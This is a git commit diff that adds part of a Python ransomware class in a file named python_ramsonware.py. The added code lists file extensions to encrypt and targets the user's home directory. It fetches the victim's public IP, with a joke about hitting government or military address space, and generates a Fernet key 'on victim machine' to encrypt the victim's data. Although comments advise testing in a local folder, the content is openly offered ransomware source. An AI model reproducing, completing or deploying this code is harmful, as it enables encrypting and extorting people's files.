948a0751ce298499b2a28a876b0d47266e32a3a5
K1ko <80548418+K1ko@users.noreply.github.com>
2022-12-28 11:33:22 +0100

    Updated Encryption part ramsonware.py

--- python_ramsonware.py
+++ python_ramsonware.py
@@ -14,3 +14,53 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 import base64
 import threading # used for ransom note and decryption key on dekstop
 
+
+
+
+class RansomWare:
+
+    
+    # File exstensions to seek out and Encrypt
+    file_exts = [
+        'txt',
+       # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
+       # -and leaves other files un-ecnrypted etc.
+       # 'png', 
+
+    ]
+
+
+    def __init__(self):
+        # Key that will be used for Fernet object and encrypt/decrypt method
+        self.key = None
+        # Encrypt/Decrypter
+        self.crypter = None
+        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
+        self.public_key = None
+
+        ''' Root directorys to start Encryption/Decryption from
+            CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
+            CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
+            CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
+        '''
+        # Use sysroot to create absolute path for files, etc. And for encrypting whole system
+        self.sysRoot = os.path.expanduser('~')
+        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
+        self.localRoot = r'D:\Coding\Python\RansomWare\RansomWare_Software\localRoot' # Debugging/Testing
+
+        # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
+        self.publicIP = requests.get('https://api.ipify.org').text
+
+
+    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
+    def generate_key(self):
+        # Generates a url safe(base64 encoded) key
+        self.key =  Fernet.generate_key()
+        # Creates a Fernet object with encrypt/decrypt methods
+        self.crypter = Fernet(self.key)
+
+    
+    # Write the fernet(symmetric key) to text file
+    def write_key(self):
+        with open('fernet_key.txt', 'wb') as f:
+            f.write(self.key)
